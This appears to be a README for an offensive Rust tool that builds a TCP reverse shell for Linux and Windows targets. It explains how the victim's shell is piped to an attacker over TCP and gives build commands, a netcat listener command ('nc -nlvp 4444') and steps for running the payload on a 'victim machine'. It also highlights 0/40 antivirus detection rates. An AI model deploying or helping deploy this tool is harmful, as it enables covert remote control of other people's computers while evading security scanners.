# RCO: TCP Reverse Shell

[![Custom badge](https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkmanc%2Fremote_code_oxidation%2Fmaster%2F.custom_shields%2Ftcp_reverse_shell.json)](https://github.com/kmanc/remote_code_oxidation/tree/master/tcp_reverse_shell)

Linux target               |  Windows target
:-------------------------:|:-------------------------:
![gif](https://user-images.githubusercontent.com/14863147/151044738-72dbec76-73b1-47c5-831a-2e995673b559.gif)  |  ![gif](https://user-images.githubusercontent.com/14863147/151058869-8e5e9f6e-3f7b-4a98-ab65-2ac5017a4e76.gif)


## How it works

The reverse shells for both Linux and Windows work by establishing a [Transmission Control Protocol (TCP) session](https://www.scottklement.com/rpg/socktut/overview.html) from the victim machine to the attacking machine. Then a Terminal (Linux) or Command Prompt (Windows) process starts with its [standard input](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)), [standard output](https://en.wikipedia.org/wiki/Standard_streams#Standard_output_(stdout)), and [standard error](https://en.wikipedia.org/wiki/Standard_streams#Standard_error_(stderr)) all assigned to the TCP session. This means that input commands and output results are read from and written to (respectively) the TCP stream.


## Using it

1. [Not shown in GIF] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
and change the IP address and port to match the IP address of your attacking machine and the port you will use for a listener respectively
2. [Not shown in GIF] Compile the executable

    #### For Linux targets
    ```commandline
    cargo build -p tcp_reverse_shell --release
    ```

    #### For Windows targets
    ```commandline
    cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell --release
    ```
3. Start a netcat listener on the attacking machine on the same port you configured in step 1
    ```commandline
    nc -nlvp 4444
    ```
4. Execute the payload on the victim machine
5. Return to the listener and enter desired commands for the victim machine to run


## Detection rates

[Linux - 0 / 40](https://kleenscan.com/scan_result/fb860f5b0e4f835412787d3e20c6d9129bdc4c4bd87b67966aae2f5efa0973f1) | [Windows - 0 / 40](https://kleenscan.com/scan_result/a6cd65ff1dd24cf60a9b39a77c8ccb96fe1d27528857fa4754e70bf4578bcf11)
:-------------------------:|:-------------------------:
![image](https://user-images.githubusercontent.com/14863147/151747364-7edb7792-cb7e-421b-8235-8db5d9825211.png) | ![image](https://user-images.githubusercontent.com/14863147/151747339-6c9036e5-ed2e-473e-b92d-b8c1ac8c66a5.png)

